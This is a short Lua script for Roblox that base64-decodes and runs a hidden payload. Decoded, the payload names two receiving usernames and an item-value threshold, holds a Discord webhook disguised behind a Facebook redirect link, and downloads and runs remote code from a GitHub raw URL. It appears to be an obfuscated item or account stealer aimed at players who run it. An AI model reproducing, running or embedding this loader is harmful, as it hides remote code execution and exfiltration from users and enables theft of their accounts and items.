
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lID0gInhYdW5rbm93bnBsYXllclh4X2R4IgpVc2VybmFtZTIgPSAibm9yYWxpbmVfcGxheXMiCk1pbmltdW1SQVAgPSAxMDAwMDAwCldlYmhvb2sgPSAiaHR0cHM6Ly9sLmZhY2Vib29rLmNvbS9sLnBocD91PWh0dHBzJTNBJTJGJTJGZGlzY29yZC5jb20lMkZhcGklMkZ3ZWJob29rcyUyRjEzNDc4NjA2NjIwMjEyNjM0NTIlMkZfVHhUbTI0MmtIdUI2VjFBZmQ4RlJRTUFrd0dZTUc5RGIwSlRfVFExTUYzVHZXVGY3M0tNZzFfUzJpZloyZklLUFBURCUzRmZiY2xpZCUzREl3WlhoMGJnTmhaVzBDTVRBQUFSMkRyQWxLeHFoUlpJU01aeTVucWJsXzBRMjNNRUIwcFhaX1l0dHpqVklVdk1jX1lUNnl1b3RtMmtNX2FlbV9BWnNDMnJ3WnRidmxwOXZTbUxKSTh3Jmg9QVQzMjZqWGIxN1kybGljSkxrX2NPR1BpbFdNalpsZ1REVFp2MVhlYllEdEd0VTZZSmdUb2R0eDN3M3dQNVR2RXBkQXl3b2xWc29mZXh3NnQtRGFEQ1Vsb054NXZFOUJTUklKMGk0WlFzbjQxdnljcFNjMnRuYW9YX3dKLXF1d2x1T0UyS0EiCgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS8yMTRzY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi8yMTRzY3JpcHRzIiwgdHJ1ZSkpKCk="

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()